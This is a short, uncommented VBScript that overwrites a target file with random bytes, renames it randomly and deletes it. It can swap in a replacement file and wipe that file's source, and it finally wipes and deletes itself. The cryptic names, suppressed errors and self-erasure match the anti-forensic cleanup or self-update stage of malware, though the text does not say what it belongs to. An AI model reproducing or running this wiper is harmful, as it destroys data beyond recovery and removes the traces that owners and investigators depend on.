Function upgr(ByVal fpOrig, ByVal fpDest)
    On Error Resume Next
    
    set fso = CreateObject("Scripting.FileSystemObject")
    fso.CopyFile fpOrig, fpDest, True
    if err then
        upgr = False
        exit function
    end if
    upgr = True
End Function

Function rsf(ByVal filePath)
    On Error Resume Next
    Dim fso, fd, i, b, nn
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set file = fso.GetFile(filePath)
    fsize = file.size
    Set fd = fso.OpenTextFile(filePath, 2, False, -2)
    if err then
        rsf = False
        exit function
    end if
    Randomize Hour(Now) * Minute(Now) * Second(Now)
    for i = 1 to fsize
        fd.write Chr(CInt(Rnd * 255))
    next
    fd.Close
    b=""
    for i=0 to 16
        if i=10 then: b = b & "."
        b = b & CStr(CInt(Rnd * 256))
    next
    file.Name = b
    file.Delete(True)
    rsf = True
End Function

Set objArgs = WScript.Arguments
If objArgs.Count = 0 then
    Wscript.Quit 0
end if

fp = objArgs(0)
fpupgr = ""
if objArgs.Count = 2 then
    fpupgr = objArgs(1)
end if

for i=0 to 9
    if rsf(fp)=True then: exit for
    WScript.Sleep 3000
next

if fpupgr <> "" then
    upgr fpupgr, fp
    for i=0 to 3
        if rsf(fpupgr) = True then: exit for
        WScript.Sleep 3000
    next
end if
rsf WScript.ScriptFullName
